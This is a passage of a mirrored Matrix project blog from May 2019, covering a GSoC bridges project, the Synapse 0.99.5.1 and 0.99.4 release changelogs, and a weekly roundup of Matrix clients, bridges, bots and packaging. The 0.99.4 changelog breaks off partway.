<p>Thanks <a href="https://matrix.to/#/@kai:nasnotfound.de">Kai</a> for this introduction to his project:</p>
<blockquote>
<p>The <em>Reliable Bridges</em> GSoC project is about implementing a feedback mechanism for the Matrix network in cases where bridges are not able to properly handle messages. Currently clients are unable to know if a message was successfully sent over a bridge. With the new mechanism in place they get the information about errors happening at bridges and can behave accordingly by e.g. notify the user of the failed delivery.</p>
<p>The implementation is foremost focused on the <a href="https://github.com/Half-Shot/matrix-appservice-discord">matrix-appservice-dicord</a> bridge which uses the underlying <a href="https://github.com/matrix-org/matrix-appservice-bridge">matrix-appservice-bridge</a>. A JS bridge was chosen so that as much code as possible is brought into the SDK and other bridges can profit sooner from the work done.</p>
<p>The first step for implementing the new feature will be the signaling of permanent errors occurring at the bridge (in contrast to temporary failures). They might occur e.g. when the sending account was banned on the bridged foreign network. These permanent errors will be implemented as a new type of PDU originating from the bridge.</p>
<p>After permanent errors are done, the subsequent weeks will see work on temporary failures which might include work on Synapse as well as work on Riot Web to have a client which actually uses the new events. As these events are new features being introduced there will also be a MSC draft. There everyone can check out the proposed solution and tear it apart with their criticism (if applicable üòâ).</p>
<p>For discussions related to the GSoC project or when you have some opinions on how the MSC should look like, you are invited to join the <a href="https://matrix.to/#/#reliablebridges:nasnotfound.de">Reliable Bridges Matrix room</a>.</p>
</blockquote>
<h2 id="that-s-all-i-know-checkered-flag">That's all I know üèÅ</h2>
<p>Finally Alan, friend of Matrix and creator of TADHack and TADSummit is doing an &quot;Open Source Telecom Software Survey&quot; - if you could add value to this research by completing it please do so here: <a href="http://alanquayle.com/2019/05/open-source-telecom-software-project-survey/">http://alanquayle.com/2019/05/open-source-telecom-software-project-survey/</a></p>
<p>See you next week, and be sure to stop by <a href="https://matrix.to/#/#twim:matrix.org">#twim:matrix.org</a> with your updates!</p>

        </div>
    </article>
    
    <article class="post">
        <header>
            <h1><a href="https:&#x2F;&#x2F;matrix.turbo.fish&#x2F;blog&#x2F;2019&#x2F;05&#x2F;21&#x2F;synapse-0-99-5-1-released&#x2F;" title="Synapse 0.99.5.1 released!">Synapse 0.99.5.1 released!</a></h1>
            <span>
                21.05.2019 00:00
                ‚Äî
                <a href="/category/releases">
                    Releases
                </a>
                ‚Äî
                
                <a href="/author/neil-johnson">
                    Neil Johnson
                </a>
                
            </span>
            
        </header>
        <div>
            <p>Okay folks, this is an important one. v0.99.5.1 will be the last release before we ship Synapse v1.0. <strong>It is really important that you upgrade to v0.99.5.1 because it implements rooms <a href="https://github.com/matrix-org/matrix-doc/blob/matthew/room_v4/proposals/2002-rooms-v4.md">version 4</a> - which is the room version that Synapse 1.0 will default to.</strong></p>
<p>This means that Synapse 1.0 servers will create new rooms as version 4 by default and servers that have not upgraded to at least v0.99.5.1 will not be able to join those rooms.</p>
<p>Over the coming days we will announce a release day for Synapse v1.0, the idea is to give admins 2 weeks notice so that anyone yet to configure their federation SSL certificate has time to do so. <strong>This is important, failure to configure your certs will mean not being able to federate with v1.0 servers.</strong> If you are not sure if you certs are valid, you can test <a href="https://federationtester.matrix.org/">here</a> and read <a href="https://github.com/matrix-org/synapse/blob/master/docs/MSC1711_certificates_FAQ.md">here</a> for more info on what to do.</p>
<p>Aside from room v4, this release also includes the ability to blacklist specific IPs from federating as well as experimental support for edits and reactions. We are not quite ready to mark the feature 'done done', but it is very close. Watch out for news as the feature lands properly.</p>
<p>We're really close to v1.0 now, give us a few more days and we'll announce an official release date.</p>
<p>As ever, you can get the new update¬†<a href="https://github.com/matrix-org/synapse/releases/tag/v0.99.5.1">here</a>¬†or any of the sources mentioned at¬†<a href="https://github.com/matrix-org/synapse">https://github.com/matrix-org/synapse</a>. Note, Synapse is now available from PyPI, pick it up¬†<a href="https://pypi.org/project/matrix-synapse/">here</a>. Also, check out our <a href="https://matrix.org/docs/guides/installing-synapse">Synapse installation guide page</a></p>
<h1 id="synapse-v0-99-5-1-changelog-since-v0-99-4">Synapse v0.99.5.1 Changelog (since v0.99.4)</h1>
<h2 id="features">Features</h2>
<ul>
<li>Add ability to blacklist IP ranges for the federation client. (<a href="https://github.com/matrix-org/synapse/issues/5043">#5043</a>)</li>
<li>Ratelimiting configuration for clients sending messages and the federation server has been altered to match login ratelimiting. The old configuration names will continue working. Check the sample config for details of the new names. (<a href="https://github.com/matrix-org/synapse/issues/5181">#5181</a>)</li>
<li>Drop support for the undocumented /_matrix/client/v2_alpha API prefix. (<a href="https://github.com/matrix-org/synapse/issues/5190">#5190</a>)</li>
<li>Add an option to disable per-room profiles. (<a href="https://github.com/matrix-org/synapse/issues/5196">#5196</a>)</li>
<li>Stick an expiration date to any registered user missing one at startup if account validity is enabled. (<a href="https://github.com/matrix-org/synapse/issues/5204">#5204</a>)</li>
<li>Add experimental support for relations (aka reactions and edits). (<a href="https://github.com/matrix-org/synapse/issues/5209">#5209</a>, <a href="https://github.com/matrix-org/synapse/issues/5211">#5211</a>, <a href="https://github.com/matrix-org/synapse/issues/5203">#5203</a>, <a href="https://github.com/matrix-org/synapse/issues/5212">#5212</a>)</li>
<li>Add a room version 4 which uses a new event ID format, as per <a href="https://github.com/matrix-org/matrix-doc/pull/2002">MSC2002</a>. (<a href="https://github.com/matrix-org/synapse/issues/5210">#5210</a>, <a href="https://github.com/matrix-org/synapse/issues/5217">#5217</a>)</li>
</ul>
<h2 id="bugfixes">Bugfixes</h2>
<ul>
<li>Fix image orientation when generating thumbnails (needs pillow&gt;=4.3.0). Contributed by Pau Rodriguez-Estivill. (<a href="https://github.com/matrix-org/synapse/issues/5039">#5039</a>)</li>
<li>Exclude soft-failed events from forward-extremity candidates: fixes &quot;No forward extremities left!&quot; error. (<a href="https://github.com/matrix-org/synapse/issues/5146">#5146</a>)</li>
<li>Re-order stages in registration flows such that msisdn and email verification are done last. (<a href="https://github.com/matrix-org/synapse/issues/5174">#5174</a>)</li>
<li>Fix 3pid guest invites. (<a href="https://github.com/matrix-org/synapse/issues/5177">#5177</a>)</li>
<li>Fix a bug where the register endpoint would fail with M_THREEPID_IN_USE instead of returning an account previously registered in the same session. (<a href="https://github.com/matrix-org/synapse/issues/5187">#5187</a>)</li>
<li>Prevent registration for user ids that are too long to fit into a state key. Contributed by Reid Anderson. (<a href="https://github.com/matrix-org/synapse/issues/5198">#5198</a>)</li>
<li>Fix incompatibility between ACME support and Python 3.5.2. (<a href="https://github.com/matrix-org/synapse/issues/5218">#5218</a>)</li>
<li>Fix error handling for rooms whose versions are unknown. (<a href="https://github.com/matrix-org/synapse/issues/5219">#5219</a>)</li>
</ul>
<h2 id="internal-changes">Internal Changes</h2>
<ul>
<li>Make /sync attempt to return device updates for both joined and invited users. Note that this doesn't currently work correctly due to other bugs. (<a href="https://github.com/matrix-org/synapse/issues/3484">#3484</a>)</li>
<li>Update tests to consistently be configured via the same code that is used when loading from configuration files. (<a href="https://github.com/matrix-org/synapse/issues/5171">#5171</a>, <a href="https://github.com/matrix-org/synapse/issues/5185">#5185</a>)</li>
<li>Allow client event serialization to be async. (<a href="https://github.com/matrix-org/synapse/issues/5183">#5183</a>)</li>
<li>Expose DataStore._get_events as get_events_as_list. (<a href="https://github.com/matrix-org/synapse/issues/5184">#5184</a>)</li>
<li>Make generating SQL bounds for pagination generic. (<a href="https://github.com/matrix-org/synapse/issues/5191">#5191</a>)</li>
<li>Stop telling people to install the optional dependencies by default. (<a href="https://github.com/matrix-org/synapse/issues/5197">#5197</a>)</li>
</ul>

        </div>
    </article>
    
    <article class="post">
        <header>
            <h1><a href="https:&#x2F;&#x2F;matrix.turbo.fish&#x2F;blog&#x2F;2019&#x2F;05&#x2F;17&#x2F;this-week-in-matrix-2019-05-17&#x2F;" title="This Week in Matrix 2019-05-17">This Week in Matrix 2019-05-17</a></h1>
            <span>
                17.05.2019 00:00
                ‚Äî
                <a href="/category/this-week-in-matrix">
                    This Week in Matrix
                </a>
                ‚Äî
                
                <a href="/author/ben-parsons">
                    Ben Parsons
                </a>
                
            </span>
            
        </header>
        <div>
            <h2 id="matrix-live-reactions-and-edits-coming-to-matrix">Matrix Live - Reactions and Edits coming to Matrix</h2>
<iframe src="https://www.youtube.com/embed/hloqX99FEQk" frameBorder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowFullScreen></iframe>
<p><del>If</del> Since you've been chatting on Matrix this week, you'll have noticed some new features rolling out.</p>
<p>In <a href="https://riot.im/develop/">Riot develop</a>, hit <code>Labs</code> in the Settings menu and you'll be able to try out the new Reactions and message editing features.</p>
<h2 id="dept-of-servers">Dept of Servers</h2>
<h3 id="synapse">Synapse</h3>
<p>Neil said:</p>
<blockquote>
<p>This week we shipped <a href="https://matrix.org/blog/2019/05/15/synapse-0-99-4-released">0.99.4</a>  - no stand out ‚Äòoh my gosh‚Äô headlines, just lot lot of bug fixes and perf improvements - get involved. We‚Äôve also been working hard to getting things like reactions and edits going, as well more prep for improving perf for small server instances.</p>
</blockquote>
<h3 id="construct">Construct</h3>
<p>First <a href="https://github.com/matrix-construct/construct/">Construct</a> update for a few weeks:</p>
<blockquote>
<p><a href="https://github.com/matrix-construct/construct/">Construct</a> has added a server command line available in any room when starting a line with a special character (by default it's '\'). The commands are private so the room doesn't actually see it. More on this next week, or check out <a href="https://matrix.to/#/#test:zemos.net">#test:zemos.net</a>.</p>
</blockquote>
<p><img src="/blog/img/2019-05-17-construct.png" alt="" /></p>
<h2 id="dept-of-sdks-and-frameworks">Dept of SDKs and Frameworks</h2>
<h3 id="ruby-sdk-now-1-0">Ruby SDK now 1.0!</h3>
<p>Big news from <a href="https://github.com/ananace/">Ananace</a> this week:</p>
<blockquote>
<p>Finished getting the test coverage to a reasonable enough percentage to feel comfortable releasing the <a href="https://github.com/ananace/ruby-matrix-sdk">Ruby Matrix SDK</a> as a nice and stable 1.0 (.0)</p>
</blockquote>
<p>This is great! All Rubyists should check it out. Ananace notes:</p>
<blockquote>
<p>I still need to set up fixtures for all the API endpoints I'm exposing so I can verify every single API call as well, but I see that as a later thing as that relates mostly to how the other side (the HS) handles my input, not to how the SDK itself handles said input</p>
</blockquote>
<h2 id="dept-of-clients">Dept of Clients</h2>
<h3 id="pattle">Pattle</h3>
<p><a href="https://matrix.to/#/@wilko:matrix.org">Wilko</a>:</p>
<blockquote>
<p>A new version of Pattle is available on F-droid!</p>
<p>Changes include:</p>
<ul>
<li>Implement direct chats correctly!
<ul>
<li>Use user user avatar as chat avatar if direct</li>
<li>Hide user name in direct chat</li>
</ul>
</li>
<li>Use names of room members if no room name is set
(whether the chat is direct or not)</li>
<li>Add border to left of replied-to messages to easily
differentiate them</li>
<li>Show redaction events!</li>
<li>Use icons instead of letters if chat has no avatar
<ul>
<li>Use different icons for direct chats than group chats
(and in the future public chats)</li>
</ul>
</li>
<li>Use user color for direct chats if the user has no avatar</li>
<li>Simplify member change messages ('Pat has joined' -&gt; 'Pat joined', etc)</li>
<li>Tweak font sizes (thanks to <a href="https://matrix.to/#/@mat:tout.im">Mathieu Velten</a>)!</li>
<li>Change date header style (smaller and full caps)</li>
</ul>
<p>Development happens <a href="https://git.pattle.im">here</a> and development discussion happens here: #pattle:matrix.org!</p>
<p>To install this release, add the following repo in F-droid:</p>
<p>https://fdroid.pattle.im/?fingerprint=E91F63CA6AE04F8E7EA53E52242EAF8779559209B8A342F152F9E7265E3EA729</p>
<p>And install 'Pattle'.</p>
</blockquote>
<p><img src="/blog/img/2019-05-17-pattle.png" alt="" /></p>
<h3 id="riot-various">Riot (various)</h3>
<p>This week the various Riot teams (web, iOS, Android)  have been spending time implementing reactions/edits, but also:</p>
<h4 id="riot-android">Riot Android</h4>
<blockquote>
<ul>
<li>PR review from community: Matomo SDK will replace Piwik SDK</li>
<li>Weblate is up again, a sync has been done.</li>
</ul>
</blockquote>
<h4 id="riotx-android">RiotX (Android)</h4>
<blockquote>
<ul>
<li>Crypto integration is still ongoing</li>
<li>Reactions are coming soon!</li>
<li>New home and navigation to rooms development started</li>
</ul>
</blockquote>
<h3 id="tangent">tangent</h3>
<p><a href="https://gitlab.com/sanlox/tangent">tangent</a> is an exciting young project designed to create a very lightweight browser-based new client. <a href="https://matrix.to/#/@sanlox:matrix.org">sanlox</a>:</p>
<blockquote>
<p>did alot of changes on tangent to make it more stable and performant, only registration and guest login are left to do, git changed to <a href="https://gitlab.com/sanlox/tangent">https://gitlab.com/sanlox/tangent</a></p>
</blockquote>
<p>Test the latest at: <a href="https://sanlox.dev/tangent/">https://sanlox.dev/tangent/</a></p>
<h3 id="spectral-timeline-ui-and-more">Spectral timeline UI and more</h3>
<p><a href="https://matrix.to/#/@bhat:encom.eu.org">Black Hat</a>:</p>
<blockquote>
<ul>
<li>Polished the timeline UI for Spectral.</li>
<li>Added <code>m.video</code> support.</li>
<li>Also added drag-and-drop support in Spectral.</li>
</ul>
</blockquote>
<p><img src="/blog/img/2019-05-17-spectral.png" alt="" /></p>
<h3 id="fractal-now-with-keyboard-shortcuts">Fractal now with keyboard shortcuts</h3>
<p><a href="https://matrix.to/#/@afranke:matrix.org">Alexandre Franke</a>:</p>
<blockquote>
<p>Ana, first time contributor, added a bunch of cool keyboard shortcuts to ease navigation in Fractal. One can now e.g. go down to the next room with unread messages with ctrl+shift+page down.</p>
</blockquote>
<p><img src="/blog/img/2019-05-17-fractal.png" alt="" /></p>
<h3 id="continuum-updates">continuum updates</h3>
<p><a href="https://matrix.to/#/@uforia:matrix.org">yuforia</a>:</p>
<blockquote>
<ul>
<li>Load message history from server lazily when scrolling</li>
<li>Loaded messages are always saved to disk, so if you aren't offline for too long, only a few messages will need to be fetched the next time you login</li>
<li>The screenshot also shows the UI for handling invitations</li>
</ul>
</blockquote>
<p><img src="/blog/img/2019-05-17-continuum.png" alt="" /></p>
<h3 id="early-day-reactions-support-in-quaternion">early-day reactions support in Quaternion</h3>
<p><a href="https://matrix.to/#/@kitsune:matrix.org">kitsune</a>:</p>
<blockquote>
<p>This week was too packed IRL but I took an hour to experiment with reactions that are a rage in riot.im/develop these days. An experimental &quot;kitsune-reactions&quot; branch understands reaction events and allows clients to further process them. A proof-of-concept in <a href="https://github.com/QMatrixClient/Quaternion">Quaternion</a> will land over the weekend.</p>
</blockquote>
<h3 id="scylla">Scylla</h3>
<p>via <a href="https://matrix.to/#/@aaron:raim.ist">Aaron Raimist</a>:</p>
<blockquote>
<p>Update on <a href="https://matrix.org/docs/projects/client/Scylla.html">Scylla</a> from <a href="https://matrix.to/#/@daniel:riot.danilafe.com">VaNilLa</a>: Though I am very busy with schoolwork, I found time to fix a long-standing issue: the names of private messages showing up as <code>&lt;No Name&gt;</code>. this is gone now, and rooms are sorted alphabetically to make it easier to navigate.<br />
Try Scylla here: <a href="https://scylla.danilafe.com">https://scylla.danilafe.com</a><br />
Come join us in <a href="https://matrix.to/#/#scylla:riot.danilafe.com">#scylla:riot.danilafe.com</a> to discuss</p>
</blockquote>
<h2 id="dept-of-bridges">Dept of Bridges</h2>
<h3 id="matrix-appservice-discord-0-5-0">matrix-appservice-discord 0.5.0</h3>
<p><a href="https://matrix.to/#/@Half-Shot:half-shot.uk">Half-Shot</a>:</p>
<blockquote>
<p>Evening, we've just cut the first RC of <a href="https://github.com/Half-Shot/matrix-appservice-discord">matrix-appservice-discord</a> 0.5.0. Most of the changes this time around are bugfixes to formatting, internal re-architecturing / performance boosts and shifting more things to the database. Please help test if you run an instance, so we can get a 0.5.0 out swiftly. The next release has a lot of features planned for it üòâ</p>
</blockquote>
<p>Also - congratulations to Half-Shot on finishing all his final-year exams! How will you fill your time now?</p>
<h3 id="mautrix-telegram-mautrix-hangouts-mautrix-facebook-mautrix-whatsapp">mautrix-telegram/mautrix-hangouts/mautrix-facebook/mautrix-whatsapp</h3>
<p>Think <a href="https://matrix.to/#/@tulir:maunium.net">tulir</a>'s been busy this week?</p>
<blockquote>
<p>Lots of small changes in my projects:</p>
<ul>
<li><a href="https://github.com/tulir/mautrix-telegram">mautrix-telegram</a> had a bunch of bugs fixed, like multiline messages from some clients not being bridged correctly.</li>
<li><a href="https://github.com/tulir/mautrix-hangouts">mautrix-hangouts</a> got matrix-&gt;hangouts image bridging and some bugfixes.</li>
<li><a href="https://github.com/tulir/mautrix-facebook">mautrix-facebook</a> also got some bugfixes.</li>
<li><a href="https://github.com/tulir/mautrix-whatsapp">mautrix-whatsapp</a> now informs the user about connection problems rather than crashing and has commands to try to reconnect. It also now bridges redactions in both directions.</li>
</ul>
</blockquote>
<h2 id="dept-of-ops">Dept of Ops</h2>
<h3 id="kubernetes-from-ananace">kubernetes from Ananace</h3>
<p><a href="https://github.com/ananace/">Ananace</a> updated their k8s packaging for Synapse to 0.99.4: <a href="https://github.com/ananace/matrix-synapse">https://github.com/ananace/matrix-synapse</a></p>
<h3 id="debian-packages">Debian Packages</h3>
<p><a href="https://matrix.to/#/@andrew:shadura.me">andrewsh</a> announced the <a href="https://matrix-team.pages.debian.net/blogue/">Debian Matrix Packagers Team has its own dedicated blog</a></p>
<blockquote>
<p>for everything about Matrix on Debian, join <a href="https://matrix.to/#/#debian-matrix:matrix.org">#debian-matrix:matrix.org</a></p>
</blockquote>
<h3 id="silvio-avhost-synapse-docker-container">silvio/avhost synapse docker container</h3>
<p><a href="https://matrix.to/#/@mathijs:matrix.vgorcum.com">Mathijs</a>:</p>
<blockquote>
<p>the <a href="https://github.com/AVENTER-UG/docker-matrix">silvio/avhost synapse docker container</a> is making progress in moving to python 3, the container is made smaller and no longer runs synapse as root</p>
</blockquote>
<p>There are some important differences between this and <a href="https://github.com/matrix-org/synapse/tree/master/contrib/docker">https://github.com/matrix-org/synapse/tree/master/contrib/docker</a>:</p>
<blockquote>
<p>it puts all the configuration files, logfiles and media files in the volume, you don't really configure it with environmental variables but just by editing the homeserver.yaml file in the volume, and it also contains coturn</p>
</blockquote>
<h2 id="dept-of-bots">Dept of Bots</h2>
<p><a href="https://matrix.to/#/@Half-Shot:half-shot.uk">Half-Shot</a> created a &quot;reactbot&quot;:</p>
<blockquote>
<p>Hot on the heels of the rapid developments of the reaction work, I've written a bot that automatically reacts when spotting certain phrases inside rooms. Honestly I have no idea what the use case is for this, but it exists and I currently use it to stick the :dog: reaction on every dog related event. <a href="https://github.com/Half-Shot/matrix-reactbot">https://github.com/Half-Shot/matrix-reactbot</a></p>
</blockquote>
<p>The bot is also now used in <a href="https://matrix.to/#/#twim:matrix.org">#twim:matrix.org</a>, whhere it performs the needed work of adding red circles to submissions.</p>
<p><a href="https://matrix.to/#/@tulir:maunium.net">tulir</a>'s <a href="https://github.com/maubot/karma">karma</a> maubot now also supports reactions and redactions, and the maubot <a href="https://github.com/maubot/sed">sed plugin</a> now underlines changes in messages.</p>
<h2 id="dept-of-status-of-matrix">Dept of <em>Status of Matrix</em></h2>
<h3 id="t2bot-io-has-launched-a-new-website">t2bot.io has launched a new website</h3>
<p><a href="https://github.com/turt2live">TravisR</a>:</p>
<blockquote>
<p><a href="https://t2bot.io/">t2bot.io</a> has launched a new website, surpassed a milestone of 300k total bridged users (70k of those are active monthly), and launched 2 new early-beta-quality bridges. If you're looking to try out tulir's latest Hangouts or Facebook Messenger bridge then <a href="https://t2bot.io/">t2bot.io</a> is an option for that, assuming you don't mind the occasional bug, missing feature, or problem. Check out https://t2bot.io/hangouts/ and https://t2bot.io/messenger/ for setup instructions.</p>
</blockquote>
<h2 id="that-s-all-i-know">That's all I know</h2>
<p>See you next week, and be sure to stop by <a href="https://matrix.to/#/#twim:matrix.org">#twim:matrix.org</a> with your updates!</p>
<p>PS Massive thanks to <a href="https://matrix.to/#/@aaron:raim.ist">Aaron Raimist</a> for doing the needful to make full articles appear in RSS!</p>

        </div>
    </article>
    
    <article class="post">
        <header>
            <h1><a href="https:&#x2F;&#x2F;matrix.turbo.fish&#x2F;blog&#x2F;2019&#x2F;05&#x2F;15&#x2F;synapse-0-99-4-released&#x2F;" title="Synapse 0.99.4 released!">Synapse 0.99.4 released!</a></h1>
            <span>
                15.05.2019 00:00
                ‚Äî
                <a href="/category/releases">
                    Releases
                </a>
                ‚Äî
                
                <a href="/author/neil-johnson">
                    Neil Johnson
                </a>
                
            </span>
            
        </header>
        <div>
            <p>Hey ho Synapse release day.</p>
<p>0.99.4 is a maintenance release collecting together all of the bug fixes and performance improvements over the past few weeks, additionally there is further support for the upcoming 1.0 release (more info coming soon). One thing worth calling out is how many community contributions have made their way into 0.99.4, take a look at the change log for details, but many thanks to everyone submitting PRs, keep them coming!</p>
<p>As ever, you can get the new update¬†<a href="https://github.com/matrix-org/synapse/releases/tag/v0.99.4">here</a>¬†or any of the sources mentioned at¬†<a href="https://github.com/matrix-org/synapse">https://github.com/matrix-org/synapse</a>. Note, Synapse is now available from PyPI, pick it up¬†<a href="https://pypi.org/project/matrix-synapse/">here</a>. Also, check out our <a href="https://matrix.org/docs/guides/installing-synapse">Synapse installation guide page</a></p>
<h1 id="synapse-0-99-4-changelog">Synapse 0.99.4 Changelog</h1>
<h2 id="features">Features</h2>
<ul>
<li>Add systemd-python to the optional dependencies to enable logging to the systemd journal. Install with <code>pip install matrix-synapse[systemd]</code>. (<a href="https://github.com/matrix-org/synapse/issues/4339">#4339</a>)</li>
<li>Add a default .m.rule.tombstone push rule. (<a href="https://github.com/matrix-org/synapse/issues/4867">#4867</a>)</li>
<li>Add ability for password provider modules to bind email addresses to users upon registration. (<a href="https://github.com/matrix-org/synapse/issues/4947">#4947</a>)</li>
<li>Implementation of <a href="https://github.com/matrix-org/matrix-doc/pull/1711">MSC1711</a> including config options for requiring valid TLS certificates for federation traffic, the ability to disable TLS validation for specific domains, and the ability to specify your own list of CA certificates. (<a href="https://github.com/matrix-org/synapse/issues/4967">#4967</a>)</li>
<li>Remove presence list support as per MSC 1819. (<a href="https://github.com/matrix-org/synapse/issues/4989">#4989</a>)</li>
<li>Reduce CPU usage starting pushers during start up. (<a href="https://github.com/matrix-org/synapse/issues/4991">#4991</a>)</li>
<li>Add a delete group admin API. (<a href="https://github.com/matrix-org/synapse/issues/5002">#5002</a>)</li>
<li>Add config option to block users from looking up 3PIDs. (<a href="https://github.com/matrix-org/synapse/issues/5010">#5010</a>)</li>
<li>Add context to phonehome stats. (<a href="https://github.com/matrix-org/synapse/issues/5020">#5020</a>)</li>
<li>Configure the example systemd units to have a log identifier of <code>matrix-synapse</code>
instead of the executable name, <code>python</code>.
Contributed by Christoph M√ºller. (<a href="https://github.com/matrix-org/synapse/issues/5023">#5023</a>)</li>
<li>Add time-based account expiration. (<a href="https://github.com/matrix-org/synapse/issues/5027">#5027</a>, <a href="https://github.com/matrix-org/synapse/issues/5047">#5047</a>, <a href="https://github.com/matrix-org/synapse/issues/5073">#5073</a>, <a href="https://github.com/matrix-org/synapse/issues/5116">#5116</a>)</li>
<li>Add support for handling /versions, /voip and /push_rules client endpoints to client_reader worker. (<a href="https://github.com/matrix-org/synapse/issues/5063">#5063</a>, <a href="https://github.com/matrix-org/synapse/issues/5065">#5065</a>, <a href="https://github.com/matrix-org/synapse/issues/5070">#5070</a>)</li>
<li>Add an configuration option to require authentication on /publicRooms and /profile endpoints. (<a href="https://github.com/matrix-org/synapse/issues/5083">#5083</a>)</li>
<li>Move admin APIs to <code>/_synapse/admin/v1</code>. (The old paths are retained for backwards-compatibility, for now). (<a href="https://github.com/matrix-org/synapse/issues/5119">#5119</a>)</li>
<li>Implement an admin API for sending server notices. Many thanks to @krombel who provided a foundation for this work. (<a href="https://github.com/matrix-org/synapse/issues/5121">#5121</a>, <a href="https://github.com/matrix-org/synapse/issues/5142">#5142</a>)</li>
</ul>
<h2 id="bugfixes">Bugfixes</h2>
<ul>
<li>Avoid redundant URL encoding of redirect URL for SSO login in the fallback login page. Fixes a regression introduced in <a href="https://github.com/matrix-org/synapse/pull/4220">#4220</a>. Contributed by Marcel Fabian Kr√ºger (&quot;<a href="https://github.com/zauguin">zaugin</a>&quot;). (<a href="https://github.com/matrix-org/synapse/issues/4555">#4555</a>)</li>
<li>Fix bug where presence updates were sent to all servers in a room when a new server joined, rather than to just the new server. (<a href="https://github.com/matrix-org/synapse/issues/4942">#4942</a>, <a href="https://github.com/matrix-org/synapse/issues/5103">#5103</a>)</li>
<li>Fix sync bug which made accepting invites unreliable in worker-mode synapses. (<a href="https://github.com/matrix-org/synapse/issues/4955">#4955</a>, <a href="https://github.com/matrix-org/synapse/issues/4956">#4956</a>)</li>
<li>start.sh: Fix the --no-rate-limit option for messages and make it bypass rate limit on registration and login too. (<a href="https://github.com/matrix-org/synapse/issues/4981">#4981</a>)</li>
<li>Transfer related groups on room upgrade. (<a href="https://github.com/matrix-org/synapse/issues/4990">#4990</a>)</li>
<li>Prevent the ability to kick users from a room they aren't in. (<a href="https://github.com/matrix-org/synapse/issues/4999">#4999</a>)</li>
<li>Fix issue #4596 so synapse_port_db script works with --curses option on Python 3. Contributed by Anders Jensen-Waud <a href="mailto:anders@jensenwaud.com">anders@jensenwaud.com</a>. (<a href="https://github.com/matrix-org/synapse/issues/5003">#5003</a>)</li>
<li>Clients timing out/disappearing while downloading from the media repository will now no longer log a spurious &quot;Producer was not unregistered&quot; message. (<a href="https://github.com/matrix-org/synapse/issues/5009">#5009</a>)</li>
<li>Fix &quot;cannot import name execute_batch&quot; error with postgres. (<a href="https://github.com/matrix-org/synapse/issues/5032">#5032</a>)</li>
<li>Fix disappearing exceptions in manhole. (<a href="https://github.com/matrix-org/synapse/issues/5035">#5035</a>)</li>
<li>Workaround bug in twisted where attempting too many concurrent DNS requests could cause it to hang due to running out of file descriptors. (<a href="https://github.com/matrix-org/synapse/issues/5037">#5037</a>)</li>
<li>Make sure we're not registering the same 3pid twice on registration. (<a href="https://github.com/matrix-org/synapse/issues/5071">#5071</a>)</li>
<li>Don't crash on lack of expiry templates. (<a href="https://github.com/matrix-org/synapse/issues/5077">#5077</a>)</li>
<li>Fix the ratelimting on third party invites. (<a href="https://github.com/matrix-org/synapse/issues/5104">#5104</a>)</li>
<li>Add some missing limitations to room alias creation. (<a href="https://github.com/matrix-org/synapse/issues/5124">#5124</a>, <a href="https://github.com/matrix-org/synapse/issues/5128">#5128</a>)</li>
<li>Limit the number of EDUs in transactions to 100 as expected by synapse. Thanks to @superboum for this work! (<a href="https://github.com/matrix-org/synapse/issues/5138">#5138</a>)</li>
<li>Fix bogus imports in unit tests. (<a href="https://github.com/matrix-org/synapse/issues/5154">#5154</a>)</li>
</ul>
<h2 id="internal-changes">Internal Changes</h2>
<ul>
<li>Add test to verify threepid auth check added in #4435. (<a href="https://github.com/matrix-org/synapse/issues/4474">#4474</a>)</li>
<li>Fix/improve some docstrings in the replication code. (<a href="https://github.com/matrix-org/synapse/issues/4949">#4949</a>)</li>
<li>Split synapse.replication.tcp.streams into smaller files. (<a href="https://github.com/matrix-org/synapse/issues/4953">#4953</a>)</li>
<li>Refactor replication row generation/parsing. (<a href="https://github.com/matrix-org/synapse/issues/4954">#4954</a>)</li>
<li>Run <code>black</code> to clean up formatting on <code>synapse/storage/roommember.py</code> and <code>synapse/storage/events.py</code>. (<a href="https://github.com/matrix-org/synapse/issues/4959">#4959</a>)</li>
<li>Remove log line for password via the admin API. (<a href="https://github.com/matrix-org/synapse/issues/4965">#4965</a>)</li>
<li>Fix typo in TLS filenames in docker/README.md. Also add the '-p' commandline option to the 'docker run' example. Contributed by Jurrie Overgoor. (<a href="https://github.com/matrix-org/synapse/issues/4968">#4968</a>)</li>
<li>Refactor room version definitions. (<a href="https://github.com/matrix-org/synapse/issues/4969">#4969</a>)</li>
<li>Reduce log level of .well-known/matrix/client responses. (<a href="https://github.com/matrix-org/synapse/issues/4972">#4972</a>)</li>
<li>Add <code>config.signing_key_path</code> that can be read by <code>synapse.config</code> utility. (<a href="https://github.com/matrix-org/synapse/issues/4974">#4974</a>)</li>
<li>Track which identity server is used when binding a threepid and use that for unbinding, as per MSC1915. (<a href="https://github.com/matrix-org/synapse/issues/4982">#4982</a>)</li>
<li>Rewrite KeyringTestCase as a HomeserverTestCase. (<a href="https://github.com/matrix-org/synapse/issues/4985">#4985</a>)</li>
<li>README updates: Corrected the default POSTGRES_USER. Added port forwarding hint in TLS section. (<a href="https://github.com/matrix-org/synapse/issues/4987">#4987</a>)</li>
<li>Remove a number of unused tables from the database schema. (<a href="https://github.com/matrix-org/synapse/issues/4992">#4992</a>, <a href="https://github.com/matrix-org/synapse/issues/5028">#5028</a>, <a href="https://github.com/matrix-org/synapse/issues/5033">#5033</a>)</li>
<li>Run <code>black</code> on the remainder of <code>synapse/storage/</code>. (<a href="https://github.com/matrix-org/synapse/issues/4996">#4996</a>)</li>
<li>Fix grammar in get_current_users_in_room and give it a docstring. (<a href="https://github.com/matrix-org/synapse/issues/4998">#4998</a>)</li>
<li>Clean up some code in the server-key Keyring. (<a href="https://github.com/matrix-org/synapse/issues/5001">#5001</a>)</li>
<li>Convert SYNAPSE_NO_TLS Docker variable to boolean for user friendliness. Contributed by Gabriel Eckerson. (<a href="https://github.com/matrix-org/synapse/issues/5005">#5005</a>)</li>
<li>Refactor synapse.storage._base._simple_select_list_paginate. (<a href="https://github.com/matrix-org/synapse/issues/5007">#5007</a>)</li>
<li>Store the notary server name correctly in server_keys_json. (<a href="https://github.com/matrix-org/synapse/issues/5024">#5024</a>)</li>
<li>Rewrite Datastore.get_server_verify_keys to reduce the number of database transactions. (<a href="https://github.com/matrix-org/synapse/issues/5030">#5030</a>)</li>
<li>Remove extraneous period from copyright headers. (<a href="https://github.com/matrix-org/synapse/issues/5046">#5046</a>)</li>
<li>Update documentation for where to get Synapse packages. (<a href="https://github.com/matrix-org/synapse/issues/5067">#5067</a>)</li>
<li>Add workarounds for pep-517 install errors. (<a href="https://github.com/matrix-org/synapse/issues/5098">#5098</a>)</li>
